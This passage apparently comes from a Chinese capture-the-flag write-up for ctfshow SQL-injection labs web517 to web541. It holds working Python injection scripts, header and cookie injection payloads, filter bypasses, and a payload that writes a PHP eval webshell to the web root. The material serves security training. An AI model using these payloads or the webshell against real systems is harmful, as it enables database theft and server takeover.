+    &quot;id&quot;:&quot;-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),3-- &quot;
+}
+
+resp = send_request(params3)
+
+# 查看列名
+params4 = {
+    &quot;id&quot;:&quot;-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag'),3-- &quot;
+}
+
+resp = send_request(params4)
+
+# 查看flag
+params5 = {
+    &quot;id&quot;:&quot;-1' union select 1,(select group_concat(flag) from ctfshow.flag),3-- &quot;
+}
+
+resp = send_request(params5)
+
+find_flag(resp)
+</code></pre>
+<h2 id="web518">web518</h2>
+<p>布尔注入，不需要闭合</p>
+<pre><code class="language-py">import requests
+import re
+
+def find_flag(text):
+    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&quot;,text)
+    print(flag[0])
+
+
+def send_request(params):
+    url = 'http://0023f82a-87bb-4405-9718-f612b60ea29c.challenge.ctf.show/'
+
+    proxies = {
+        &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;
+    }
+
+    headers = {
+        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;
+    }
+    resp = requests.get(url=url,params=params,headers=headers,proxies=proxies)
+
+    return resp.text
+
+params1 = {
+    &quot;id&quot;:&quot;-1 union select 1,2,3-- &quot;
+}
+
+resp = send_request(params1)
+
+# 查看所有数据库名
+params2 = {
+    &quot;id&quot;:&quot;-1 union select 1,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),3-- &quot;
+}
+
+resp = send_request(params2)
+
+# 查看表名
+params3 = {
+    &quot;id&quot;:&quot;-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),3-- &quot;
+}
+
+resp = send_request(params3)
+
+# 查看列名
+params4 = {
+    &quot;id&quot;:&quot;-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flagaa'),3-- &quot;
+}
+
+resp = send_request(params4)
+
+# 查看flag
+params5 = {
+    &quot;id&quot;:&quot;-1 union select 1,(select group_concat(flagac) from ctfshow.flagaa),3-- &quot;
+}
+
+resp = send_request(params5)
+
+find_flag(resp)
+</code></pre>
+<h2 id="web519">web519</h2>
+<p>union注入，使用<code>')</code>闭合</p>
+<pre><code class="language-py">import requests
+import re
+
+def find_flag(text):
+    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&quot;,text)
+    print(flag[0])
+
+
+def send_request(params):
+    url = 'http://2da78177-bddf-46d6-a6af-1db26a56d066.challenge.ctf.show/'
+
+    proxies = {
+        &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;
+    }
+
+    headers = {
+        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;
+    }
+    resp = requests.get(url=url,params=params,headers=headers,proxies=proxies)
+
+    return resp.text
+
+params1 = {
+    &quot;id&quot;:&quot;-1') union select 1,2,3-- &quot;
+}
+
+resp = send_request(params1)
+
+# 查看所有数据库名
+params2 = {
+    &quot;id&quot;:&quot;-1') union select 1,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),3-- &quot;
+}
+
+resp = send_request(params2)
+
+# 查看表名
+params3 = {
+    &quot;id&quot;:&quot;-1') union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),3-- &quot;
+}
+
+resp = send_request(params3)
+
+# 查看列名
+params4 = {
+    &quot;id&quot;:&quot;-1') union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flagaanec'),3-- &quot;
+}
+
+resp = send_request(params4)
+
+# 查看flag
+params5 = {
+    &quot;id&quot;:&quot;-1') union select 1,(select group_concat(flagaca) from ctfshow.flagaanec),3-- &quot;
+}
+
+resp = send_request(params5)
+
+find_flag(resp)
+</code></pre>
+<h2 id="web520">web520</h2>
+<p>union注入，使用<code>&quot;)</code>闭合</p>
+<pre><code class="language-py">import requests
+import re
+
+def find_flag(text):
+    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&quot;,text)
+    print(flag[0])
+
+
+def send_request(params):
+    url = 'http://e1bf823f-4a25-4396-99cb-7ad61e90086d.challenge.ctf.show/'
+
+    proxies = {
+        &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;
+    }
+
+    headers = {
+        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;
+    }
+    resp = requests.get(url=url,params=params,headers=headers,proxies=proxies)
+
+    return resp.text
+
+params1 = {
+    &quot;id&quot;:&quot;-1\&quot;) union select 1,2,3-- &quot;
+}
+
+resp = send_request(params1)
+
+# 查看所有数据库名
+params2 = {
+    &quot;id&quot;:&quot;-1\&quot;) union select 1,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),3-- &quot;
+}
+
+resp = send_request(params2)
+
+# 查看表名
+params3 = {
+    &quot;id&quot;:&quot;-1\&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),3-- &quot;
+}
+
+resp = send_request(params3)
+
+# 查看列名
+params4 = {
+    &quot;id&quot;:&quot;-1\&quot;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flagsf'),3-- &quot;
+}
+
+resp = send_request(params4)
+
+# 查看flag
+params5 = {
+    &quot;id&quot;:&quot;-1\&quot;) union select 1,(select group_concat(flag23) from ctfshow.flagsf),3-- &quot;
+}
+
+resp = send_request(params5)
+
+find_flag(resp)
+</code></pre>
+<h2 id="web521">web521</h2>
+<p>布尔注入，使用<code>'</code>闭合</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://6f1c2196-49fe-4141-bdbc-7120d82154b3.challenge.ctf.show/?id=1'and &quot;
+
+result = ''
+i = 0
+
+proxies = {
+    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
+}
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)%23'
+        # payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)%23'
+        payload = f'if(ascii(substr((select group_concat(flag33) from ctfshow.flagpuck),{i},1))&gt;{mid},1,0)%23'
+
+        r = requests.get(url + payload,proxies=proxies)
+        if &quot;You are in...........&quot; in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web522">web522</h2>
+<p>布尔注入，使用<code>&quot;</code>闭合</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://5adfc251-2ed4-4f73-8de4-287eda414c6e.challenge.ctf.show/?id=1\&quot; and &quot;
+
+result = ''
+i = 0
+
+proxies = {
+    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
+}
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot; ),{i},1))&gt;{mid},1,0)%23'
+        # payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;),{i},1))&gt;{mid},1,0)%23'
+        payload = f'if(ascii(substr((select group_concat(flag3a3) from ctfshow.flagpa),{i},1))&gt;{mid},1,0)%23'
+
+        r = requests.get(url + payload,proxies=proxies)
+        if &quot;You are in...........&quot; in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web523">web523</h2>
+<pre><code>?id=1%27))%20union%20select%20NULL,0x3c3f70687020406576616c28245f504f53545b315d293f3e,NULL%20into%20outfile%20&quot;/var/www/html/1.php&quot;%23
+</code></pre>
+<p>使用into outfile写入shell</p>
+<pre><code>&lt;?php @eval($_POST[1])?&gt;
+0x3c3f70687020406576616c28245f504f53545b315d293f3e
+</code></pre>
+<h2 id="web524">web524</h2>
+<p>时间盲注，使用<code>'</code>闭合。</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://c2e9c750-261e-41b2-b8eb-f2306b836355.challenge.ctf.show//?id=1%27and%20&quot;
+
+result = ''
+i = 0
+
+proxies = {
+    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
+}
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1.5),0)%23'
+        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(0.7),0)%23'
+        payload = f'if(ascii(substr((select/**/group_concat(flag423)from(ctfshow.flagjugg)),{i},1))&gt;{mid},sleep(0.6),0)%23'
+
+
+        try:
+            r = requests.get(url + payload,proxies=proxies, timeout=0.5)
+            tail = mid
+        except:
+            head = mid + 1
+
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web525">web525</h2>
+<p>时间盲注，使用<code>'</code>闭合</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://56ab9933-1353-496e-83ee-3fc733ae8df8.challenge.ctf.show//?id=1%27and%20&quot;
+
+result = ''
+i = 0
+
+proxies = {
+    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
+}
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1.5),0)%23'
+        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(0.7),0)%23'
+        payload = f'if(ascii(substr((select/**/group_concat(flag4a23)from(ctfshow.flagug)),{i},1))&gt;{mid},sleep(0.6),0)%23'
+
+
+        try:
+            r = requests.get(url + payload,proxies=proxies, timeout=0.5)
+            tail = mid
+        except:
+            head = mid + 1
+
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web526">web526</h2>
+<p>时间盲注，使用<code>&quot;</code>闭合。</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://f2b55919-bcd4-4a5f-bec2-d835aee7be4a.challenge.ctf.show/?id=1\&quot;and%20&quot;
+
+result = ''
+i = 7
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1.1),0)%23'
+        payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1.1),0)%23'
+        payload = f'if(ascii(substr((select/**/group_concat(flag43s)from(ctfshow.flagugs)),{i},1))&gt;{mid},sleep(1.1),0)%23'
+
+        try:
+            r = requests.get(url + payload,timeout=1)
+            tail = mid
+        except:
+            head = mid + 1
+
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web527">web527</h2>
+<p><code>'</code>闭合</p>
+<pre><code>passwd=1&amp;uname=-1'union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1'union select 1,group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1'union select 1,group_concat(flag43s) from ctfshow.flagugsd#
+</code></pre>
+<h2 id="web528">web528</h2>
+<p><code>&quot;)</code>闭合</p>
+<pre><code>passwd=1&amp;uname=-1&quot;)union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1&quot;)union select 1,group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1&quot;)union select 1,group_concat(flag43as
+) from ctfshow.flagugsds#
+</code></pre>
+<h2 id="web529">web529</h2>
+<p><code>')</code>闭合<br>
+没有回显，使用报错注入<code>updatexml</code></p>
+<pre><code>passwd=1&amp;uname=-1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),0)#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),0)#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1') and updatexml(1,concat(0x7e,(select flag4 from ctfshow.flag)),0)#
+passwd=1&amp;uname=-1') and updatexml(1,concat(0x7e,(select right(flag4,20) from ctfshow.flag)),0)#
+</code></pre>
+<h2 id="web530">web530</h2>
+<p><code>&quot;</code>闭合<br>
+没有回显，使用报错注入<code>updatexml</code></p>
+<pre><code>passwd=1&amp;uname=-1&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),0)#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),0)#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1&quot; and updatexml(1,concat(0x7e,(select flag4s from ctfshow.flagb)),0)#
+passwd=1&amp;uname=-1&quot; and updatexml(1,concat(0x7e,(select right(flag4s,20) from ctfshow.flagb)),0)#
+</code></pre>
+<h2 id="web531">web531</h2>
+<p><code>'</code>闭合<br>
+没有回显及报错信息，使用布尔盲注。</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://da743c68-9836-40dd-af7d-2260c9256357.challenge.ctf.show/&quot;
+
+result = ''
+i = 0
+
+proxy = {
+    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
+}
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload ={
+        #     &quot;uname&quot;:f&quot;-1' or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))&gt;{mid},1,0)#&quot;,
+        #     &quot;passwd&quot;:&quot;123&quot;,
+        #     &quot;submit&quot;:&quot;Submit&quot;
+        # }
+        # payload ={
+        #     &quot;uname&quot;:f&quot;-1' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),{i},1))&gt;{mid},1,0)#&quot;,
+        #     &quot;passwd&quot;:&quot;123&quot;,
+        #     &quot;submit&quot;:&quot;Submit&quot;
+        # }
+        # payload ={
+        #     &quot;uname&quot;:f&quot;-1' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow'),{i},1))&gt;{mid},1,0)#&quot;,
+        #     &quot;passwd&quot;:&quot;123&quot;,
+        #     &quot;submit&quot;:&quot;Submit&quot;
+        # }
+        payload ={
+            &quot;uname&quot;:f&quot;-1' or if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagba),{i},1))&gt;{mid},1,0)#&quot;,
+            &quot;passwd&quot;:&quot;123&quot;,
+            &quot;submit&quot;:&quot;Submit&quot;
+        }
+        # payload = 
+
+        r = requests.post(url=url, data=payload,proxies=proxy)
+        if 'flag.jpg' in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web532">web532</h2>
+<p><code>&quot;)</code>闭合<br>
+没有回显及报错信息，使用布尔盲注。</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://7e9bdf22-362a-4365-81e7-804e55517648.challenge.ctf.show/&quot;
+
+result = ''
+i = 0
+
+proxy = {
+    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
+}
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload ={
+        #     &quot;uname&quot;:f&quot;-1\&quot;) or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))&gt;{mid},1,0)#&quot;,
+        #     &quot;passwd&quot;:&quot;123&quot;,
+        #     &quot;submit&quot;:&quot;Submit&quot;
+        # }
+        # payload ={
+        #     &quot;uname&quot;:f&quot;-1\&quot;) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),{i},1))&gt;{mid},1,0)#&quot;,
+        #     &quot;passwd&quot;:&quot;123&quot;,
+        #     &quot;submit&quot;:&quot;Submit&quot;
+        # }
+        # payload ={
+        #     &quot;uname&quot;:f&quot;-1\&quot;) or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow'),{i},1))&gt;{mid},1,0)#&quot;,
+        #     &quot;passwd&quot;:&quot;123&quot;,
+        #     &quot;submit&quot;:&quot;Submit&quot;
+        # }
+        payload ={
+            &quot;uname&quot;:f&quot;-1\&quot;) or if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagbab),{i},1))&gt;{mid},1,0)#&quot;,
+            &quot;passwd&quot;:&quot;123&quot;,
+            &quot;submit&quot;:&quot;Submit&quot;
+        }
+        # payload = 
+
+        r = requests.post(url=url, data=payload,proxies=proxy)
+        if 'flag.jpg' in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web533">web533</h2>
+<p><code>'</code>闭合，update型报错注入</p>
+<pre><code>uname=admin&amp;passwd=123' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),0x7e),1)#
+</code></pre>
+<pre><code>uname=admin&amp;passwd=123' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow'),0x7e),1)#
+</code></pre>
+<pre><code>uname=admin&amp;passwd=123' and updatexml(1,concat(0x7e,(select flag4 from ctfshow.flag),0x7e),1)#
+</code></pre>
+<pre><code>uname=admin&amp;passwd=123' and updatexml(1,concat(0x7e,right((select flag4 from ctfshow.flag),20),0x7e),1)#
+</code></pre>
+<h2 id="web534">web534</h2>
+<p>使用账号admin/admin登录，会显示UA头及IP Referer地址<br>
+UA头注入<br>
+这里无法使用注释符，使用引号闭合后面的引号。</p>
+<p>后端源码：</p>
+<pre><code class="language-php">&lt;?php
+ $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)&quot;;
+mysql_query($insert);
+print_r(mysql_error());	
+</code></pre>
+<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1) and'
+</code></pre>
+<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),1) and'
+</code></pre>
+<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),1) and'
+</code></pre>
+<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select group_concat(flag4) from ctfshow.flag)),1) and'
+</code></pre>
+<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1) and'
+</code></pre>
+<h2 id="web535">web535</h2>
+<p>使用账号admin/admin登录，会显示IP Referer地址<br>
+Referer头注入<br>
+这里无法使用注释符，使用引号闭合后面的引号。</p>
+<p>后端源码：</p>
+<pre><code class="language-php">&lt;?php
+$uagent = $_SERVER['HTTP_REFERER'];
+$IP = $_SERVER['REMOTE_ADDR'];
+$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')&quot;;
+mysql_query($insert);
+print_r(mysql_error());
+</code></pre>
+<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1) and'
+</code></pre>
+<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),1) and'
+</code></pre>
+<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),1) and'
+</code></pre>
+<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select group_concat(flag4) from ctfshow.flag)),1) and'
+</code></pre>
+<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1) and'
+</code></pre>
+<h2 id="web536">web536</h2>
+<p>使用账号admin/admin登录，会显示Cookie值<br>
+Cookie头注入</p>
+<p>后台源码：</p>
+<pre><code class="language-php">&lt;?php
+$sql=&quot;SELECT * FROM users WHERE username='$cookee' LIMIT 0,1&quot;;
+			$result=mysql_query($sql);
+			if (!$result)
+  				{
+  				die('Issue with your mysql: ' . mysql_error());
+  				}
+</code></pre>
+<pre><code>Cookie: uname='and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1)#
+</code></pre>
+<pre><code>Cookie:uname='and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),1)#
+</code></pre>
+<pre><code>Cookie:uname='and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),1)#
+</code></pre>
+<pre><code>Cookie:uname='and updatexml(1,concat(0x3d,(select group_concat(flag4) from ctfshow.flag)),1)#
+</code></pre>
+<pre><code>Cookie:uname='and updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1)#
+</code></pre>
+<h2 id="web537">web537</h2>
+<p><code>')</code>闭合<br>
+使用账号admin/admin登录，会显示base64编码的Cookie值<br>
+Cookie头注入</p>
+<p>后端源码：</p>
+<pre><code class="language-php">&lt;?php&gt;
+$cookee = base64_decode($cookee);
+echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;
+$sql=&quot;SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+if (!$result)
+    {
+    die('Issue with your mysql: ' . mysql_error());
+    }
+
+</code></pre>
+<pre><code>Cookie: uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCBncm91cF9jb25jYXQoc2NoZW1hX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhKSksMSkj
+</code></pre>
+<pre><code>Cookie:uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0iY3Rmc2hvdyIpKSwxKSM=
+</code></pre>
+<pre><code>Cookie:uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hPSJjdGZzaG93IikpLDEpIw==
+</code></pre>
+<pre><code>Cookie:uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCBncm91cF9jb25jYXQoZmxhZzQpIGZyb20gY3Rmc2hvdy5mbGFnKSksMSkj
+</code></pre>
+<pre><code>Cookie:uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCByaWdodChmbGFnNCwyMCkgZnJvbSBjdGZzaG93LmZsYWcpKSwxKSM=
+</code></pre>
+<h2 id="web538">web538</h2>
+<p><code>&quot;</code>闭合，其他和上题相同</p>
+<pre><code>Cookie: uname=ImFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHgzZCwoc2VsZWN0IHJpZ2h0KGZsYWc0LDIwKSBmcm9tIGN0ZnNob3cuZmxhZykpLDEpIw==
+</code></pre>
+<pre><code>Cookie: uname=ImFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHgzZCwoc2VsZWN0IGdyb3VwX2NvbmNhdChmbGFnNCkgZnJvbSBjdGZzaG93LmZsYWcpKSwxKSM=
+</code></pre>
+<h2 id="web539">web539</h2>
+<p>过滤了注释符的报错注入。</p>
+<p>后端源码：</p>
+<pre><code class="language-php">&lt;?php
+$reg = &quot;/#/&quot;;
+$reg1 = &quot;/--/&quot;;
+$replace = &quot;&quot;;
+$id = preg_replace($reg, $replace, $id);
+$id = preg_replace($reg1, $replace, $id)
+
+$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+
+	if($row)
+	{
+  	echo '&lt;font color= &quot;#0000ff&quot;&gt;';	
+  	echo 'Your Login name:'. $row['username'];
+  	echo &quot;&lt;br&gt;&quot;;
+  	echo 'Your Password:' .$row['password'];
+  	echo &quot;&lt;/font&gt;&quot;;
+  	}
+	else 
+	{
+	echo '&lt;font color= &quot;#FFFF00&quot;&gt;';
+	print_r(mysql_error());
+	echo &quot;&lt;/font&gt;&quot;;  
+	}
+}
+</code></pre>
+<pre><code>id='and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1) and'
+</code></pre>
+<pre><code>id='and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),1) and'
+</code></pre>
+<pre><code>id='and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),1) and'
+</code></pre>
+<pre><code>id='and updatexml(1,concat(0x3d,(select group_concat(flag4) from ctfshow.flag)),1) and'
+</code></pre>
+<pre><code>id='and updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1) and'
+</code></pre>
+<h2 id="web540">web540</h2>
+<p>后台源码:<br>
+pass_change.php</p>
+<pre><code class="language-php">&lt;?php
+# Validating the user input........
+	$username= $_SESSION[&quot;username&quot;];
+	$curr_pass= mysql_real_escape_string($_POST['current_password']);
+	$pass= mysql_real_escape_string($_POST['password']);
+	$re_pass= mysql_real_escape_string($_POST['re_password']);
+	
+	if($pass==$re_pass)
+	{	
+		$sql = &quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' &quot;;
+		$res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
+		$row = mysql_affected_rows();
+		echo '&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;';
+		echo '&lt;center&gt;';
+		if($row==1)
+		{
+			echo &quot;Password successfully updated&quot;;
+	
+		}
+		else
+		{
+			header('Location: failed.php');
+			//echo 'You tried to be smart, Try harder!!!! :( ';
+		}
+	}
+</code></pre>
+<p>可以看到只有<code>$_SESSION[&quot;username&quot;]</code>没有被过滤，我们注册账号可以控制值，二次注入。</p>
+<p>使用时间盲注，编写脚本（copy from Y4）</p>
+<pre><code class="language-py">import requests
+session = requests.session()
+
+result = ''
+i = 0
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1),0)'
+        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(0.7),0)'
+        payload = f'if(ascii(substr((select/**/group_concat(flag4)from(ctfshow.flag)),{i},1))&gt;{mid},sleep(0.6),0)'
+        username = f&quot;admin' and {payload} or '1'='1&quot;
+        url1 = 'http://88168b56-d788-46e8-be60-ead77e054e6f.challenge.ctf.show/login_create.php'
+        data = {
+            'username': username,
+            'password': '1',
+            're_password': '1',
+            'submit': 'Register'
+        }
+        r = session.post(url1, data=data)
+        url2 = 'http://88168b56-d788-46e8-be60-ead77e054e6f.challenge.ctf.show/login.php'
+        data = {
+            'login_user': username,
+            'login_password': '1',
+            'mysubmit': 'Login',
+        }
+        r = session.post(url2, data=data)
+        url3 = 'http://88168b56-d788-46e8-be60-ead77e054e6f.challenge.ctf.show/pass_change.php'
+        data = {
+            'current_password': '1',
+            'password': '2',
+            're_password': '2',
+            'submit': 'Reset'
+        }
+
+        try:
+            r = session.post(url3,data=data,timeout=0.5)
+            tail = mid
+        except:
+            head = mid + 1
+
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web541">web541</h2>
+<p>过滤了<code>or</code>和<code>and</code><br>
+使用重写绕过</p>
+<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20group_concat(schema_name)%20from%20infoorrmation_schema.schemata)),1)--+
+</code></pre>
+<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20group_concat(table_name)%20from%20infoorrmation_schema.tables where table_schema=&quot;ctfshow&quot;)),1)--+
+</code></pre>
+<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20group_concat(column_name)%20from%20infoorrmation_schema.columns where table_schema=&quot;ctfshow&quot;)),1)--+
+</code></pre>
+<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20flag4s%20from%20ctfshow.flags)),1)--+
